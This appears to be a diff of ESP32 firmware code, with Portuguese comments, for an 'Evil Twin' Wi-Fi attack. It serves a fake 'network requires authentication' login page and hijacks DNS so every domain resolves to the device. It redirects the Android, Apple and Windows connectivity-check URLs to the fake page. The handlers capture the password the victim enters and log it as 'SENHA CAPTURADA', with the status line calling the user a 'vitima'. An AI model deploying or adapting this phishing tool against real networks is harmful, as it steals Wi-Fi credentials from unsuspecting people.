@@ -1,38 +1,12 @@
-// ============================================================
-// wifi_portal.cpp - Captive Portal para Evil Twin
-// ============================================================
-// CORREÇÃO CRÍTICA: Esta versão NÃO cria um WebServer próprio.
-// Em vez disso, registra as rotas do portal no WebServer da API
-// (apiServer, porta 8080) que já existe em wifi_api.cpp.
-//
-// Versão anterior criava `static WebServer server(80)` que, ao
-// ser construído no boot (variável estática global), entrava em
-// conflito com o apiServer(8080) e causava bootloop infinito
-// quando o WiFi.softAP() era chamado no setup().
-//
-// Agora o portal roda NA MESMA PORTA 8080 da API. O cliente que
-// se conecta ao Evil Twin acessa http://192.168.4.1:8080/ e vê
-// a página de login. Os endpoints /api/* continuam funcionando
-// normalmente porque são registrados ANTES das rotas do portal.
-// ============================================================
-
 #include "wifi_portal.h"
 #include "config.h"
 #include <WiFi.h>
 #include <WebServer.h>
 #include <DNSServer.h>
 
-// Referência ao WebServer da API (definido em wifi_api.cpp)
-// NÃO criamos um novo WebServer - usamos o mesmo da API.
-extern WebServer& getApiServer();
-extern bool isAPIServerRunning();  // mesma casing do wifi_api.cpp
-
-// DNS Server ainda é necessário para o captive portal
-// (redireciona qualquer domínio para 192.168.4.1)
+static WebServer server(80);
 static DNSServer dnsServer;
-static bool dnsActive = false;
 static bool portalActive = false;
-static bool portalRoutesRegistered = false;
 static char portalPassword[64] = {0};
 static const char* portalStatusMsg = "Aguardando...";
 
@@ -63,7 +37,7 @@ button:hover{background:#5a6fd6}
 <div class="icon">WiFi</div>
 <h1>Conectar à rede</h1>
 <p class="desc">Esta rede requer autenticação adicional para acesso à internet.</p>
-<form action="/portal_post" method="POST" onsubmit="this.querySelector('button').textContent='Conectando...';this.querySelector('button').disabled=true;">
+<form action="/post" method="POST" onsubmit="this.querySelector('button').textContent='Conectando...';this.querySelector('button').disabled=true;">
 <input type="password" name="pass" placeholder="Senha da rede" required autocomplete="off">
 <button type="submit">Conectar</button>
 </form>
@@ -99,19 +73,13 @@ p{color:#666;font-size:14px}
 </html>
 )rawliteral";
 
-// ============================================================
-// HANDLERS DO PORTAL (rodam no apiServer)
-// ============================================================
-
-static void handlePortalRoot() {
-    WebServer& srv = getApiServer();
-    srv.send(200, "text/html", portalHTML);
+static void handleRoot() {
+    server.send(200, "text/html", portalHTML);
 }
 
-static void handlePortalPost() {
-    WebServer& srv = getApiServer();
-    if (srv.hasArg("pass")) {
-        String pass = srv.arg("pass");
+static void handlePost() {
+    if (server.hasArg("pass")) {
+        String pass = server.arg("pass");
         if (pass.length() > 0) {
             strncpy(portalPassword, pass.c_str(), 63);
             portalPassword[63] = '\0';
@@ -121,95 +89,70 @@ static void handlePortalPost() {
             portalStatusMsg = "SENHA CAPTURADA!";
             Serial.printf("[Portal] PASSWORD CAPTURED: %s\n", capturedPassword);
         }
-        srv.send(200, "text/html", successHTML);
+        server.send(200, "text/html", successHTML);
     } else {
-        srv.send(400, "text/plain", "Bad Request");
+        server.send(400, "text/plain", "Bad Request");
     }
 }
 
-static void handlePortalCaptive() {
-    WebServer& srv = getApiServer();
-    // Redireciona para a página de login do portal
-    srv.sendHeader("Location", "http://192.168.4.1:8080/", true);
-    srv.send(302, "text/plain", "");
+static void handleCaptive() {
+    server.sendHeader("Location", "http://192.168.4.1/", true);
+    server.send(302, "text/plain", "");
 }
 
-// ============================================================
-// API PÚBLICA
-// ============================================================
-
-void startPortal(const char* ssid) {
-    if (portalActive) return;
-
-    // Só registra rotas se a API server já estiver rodando
-    if (!isAPIServerRunning()) {
-        Serial.println(F("[Portal] ERRO: API server nao rodando, portal abortado"));
+static void handleNotFound() {
+    // Se nao for nosso IP, redireciona (captive portal detection)
+    if (server.hostHeader() != "192.168.4.1") {
+        handleCaptive();
         return;
     }
+    server.send(404, "text/plain", "Not Found");
+}
+
+void startPortal(const char* ssid) {
+    if (portalActive) stopPortal();
 
     portalActive = true;
     portalPassword[0] = '\0';
     portalStatusMsg = "Aguardando vitima...";
     passwordCaptured = false;
 
-    WebServer& srv = getApiServer();
+    // Inicia DNS server - responde tudo com 192.168.4.1
+    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
 
-    // Registra rotas do portal NO MESMO WebServer da API
-    // Importante: NÃO usar onNotFound() porque ia conflitar com a API
-    srv.on("/", HTTP_GET, handlePortalRoot);
-    srv.on("/portal_post", HTTP_POST, handlePortalPost);
+    // Configura handlers do web server
+    server.on("/", handleRoot);
+    server.on("/post", HTTP_POST, handlePost);
 
-    // Captive portal detection endpoints (todos redirecionam para /)
-    srv.on("/generate_204", HTTP_GET, handlePortalCaptive);           // Android
-    srv.on("/gen_204", HTTP_GET, handlePortalCaptive);                // Android alt
-    srv.on("/fwlink", HTTP_GET, handlePortalCaptive);                 // Windows
-    srv.on("/hotspot-detect.html", HTTP_GET, handlePortalCaptive);    // Apple
-    srv.on("/library/test/success.html", HTTP_GET, handlePortalCaptive);
-    srv.on("/connecttest.txt", HTTP_GET, handlePortalCaptive);        // Windows NCSI
-    srv.on("/redirect", HTTP_GET, handlePortalCaptive);               // Genérico
-    srv.on("/login", HTTP_GET, handlePortalCaptive);                  // Genérico
-    srv.on("/auth", HTTP_GET, handlePortalCaptive);                   // Genérico
+    // Captive portal detection endpoints
+    server.on("/generate_204", handleCaptive);           // Android
+    server.on("/gen_204", handleCaptive);                // Android alternativo
+    server.on("/fwlink", handleCaptive);                 // Windows
+    server.on("/hotspot-detect.html", handleCaptive);    // Apple
+    server.on("/library/test/success.html", handleCaptive); // Apple alternativo
+    server.on("/connecttest.txt", handleCaptive);        // Windows NCSI
+    server.on("/redirect", handleCaptive);               // Generico
+    server.on("/login", handleCaptive);                  // Generico
+    server.on("/auth", handleCaptive);                   // Generico
 
-    portalRoutesRegistered = true;
+    server.onNotFound(handleNotFound);
+    server.begin();
 
-    // Inicia DNS server (porta 53) - responde tudo com 192.168.4.1
-    // DNS é separado do WebServer, não causa conflito
-    if (!dnsActive) {
-        dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-        dnsActive = true;
-    }
-
-    Serial.printf("[Portal] Ativo em http://192.168.4.1:8080/ para SSID: %s\n", ssid);
+    Serial.printf("[Portal] Started on 192.168.4.1 for SSID: %s\n", ssid);
 }
 
 void stopPortal() {
     if (!portalActive) return;
     portalActive = false;
-
-    // Para o DNS server
-    if (dnsActive) {
-        dnsServer.stop();
-        dnsActive = false;
-    }
-
-    // Nota: não dá para remover rotas individuais do WebServer
-    // facilmente. As rotas /, /portal_post, etc ficam registradas
-    // mas inofensivas (só respondem se alguém acessar).
-    // O handler "/" do portal pode conflitar com a página inicial
-    // da API, mas a API não usa "/" para nada, então tudo bem.
-
-    portalRoutesRegistered = false;
-    Serial.println(F("[Portal] Desativado"));
+    server.stop();
+    dnsServer.stop();
+    Serial.println("[Portal] Stopped");
 }
 
 void portalLoop() {
     if (!portalActive) return;
-    // Processa requisições DNS (captive portal detection)
-    if (dnsActive) {
-        dnsServer.processNextRequest();
-    }
-    // Nota: o apiServer.handleClient() já é chamado no apiLoop()
-    // em wifi_api.cpp, então NÃO chamamos aqui.
+    dnsServer.processNextRequest();
+    server.handleClient();
 }
 
 bool isPortalActive() { return portalActive; }
